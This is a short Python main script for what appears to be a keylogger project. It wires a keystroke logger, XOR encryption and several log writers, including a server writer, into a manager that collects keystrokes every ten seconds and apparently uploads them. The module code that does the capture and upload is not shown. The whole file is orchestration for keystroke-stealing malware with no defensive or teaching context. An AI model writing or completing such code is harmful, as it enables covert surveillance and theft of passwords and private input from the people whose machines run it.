from keylogger.encryptors import XorEncryption
from keylogger.keyloggers import SimpleKeylogger
from keylogger.logwriters import JsonLogWriter, ConsoleLogWriter, FileLogWriter, ServerLogWriter
from keylogger.manager import KeyLoggerManager

if __name__ == "__main__":
    # Initialize components
    keylogger = SimpleKeylogger()
    console_log_writer = ConsoleLogWriter()
    txt_log_writer = FileLogWriter("log1")
    json_log_writer = JsonLogWriter("file1_new")
    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")  # for debugging purposes
    decrypted_log_writer = JsonLogWriter("file1_new_decrypted")  # for debugging purposes
    server_log_writer = ServerLogWriter()
    encryptor = XorEncryption()
    interval = 10  # Log collection interval in seconds

    # Start the keylogger manager
    manager = KeyLoggerManager(keylogger, server_log_writer, encrypted_log_writer, decrypted_log_writer, encryptor,
                               interval)
    manager.start()
